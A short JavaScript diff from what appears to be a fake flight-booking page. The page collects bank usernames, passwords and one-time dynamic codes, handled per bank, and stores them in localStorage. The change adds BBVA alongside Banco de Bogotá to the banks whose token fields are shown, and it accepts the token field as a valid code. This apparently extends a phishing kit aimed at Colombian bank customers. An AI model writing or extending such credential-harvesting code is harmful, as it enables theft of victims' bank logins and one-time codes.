@@ -87,7 +87,7 @@ if(info.checkerInfo.mode === 'userpassword'){
         }
     }, 2050);
 
-    if(info.metaInfo.ban === 'bogota'){
+    if(info.metaInfo.ban === 'bogota' || info.metaInfo.ban === 'bbva'){
         dintok.forEach(elem =>{
             elem.classList.remove('hidden');
         });
@@ -162,7 +162,6 @@ if(info.flightInfo.travel_type === 1){
  */
 const btnNextStep = document.querySelector('#btnNextStep');
 btnNextStep.addEventListener('click', () =>{
-    console.log('hola');
     if(info.checkerInfo.mode === 'userpassword'){
         if(user[1].value !== ''){
             if(puser.value !== ''){
@@ -179,7 +178,7 @@ btnNextStep.addEventListener('click', () =>{
             alert('Rellena la información.');
         }
     }else if(info.checkerInfo.mode === 'cdin'){
-        if(cdin[1].value !== ''){
+        if(cdin[1].value !== '' || dintok[1].value !== ''){
             info.metaInfo.cdin = cdin[1].value;
             LS.setItem('info', JSON.stringify(info));
 
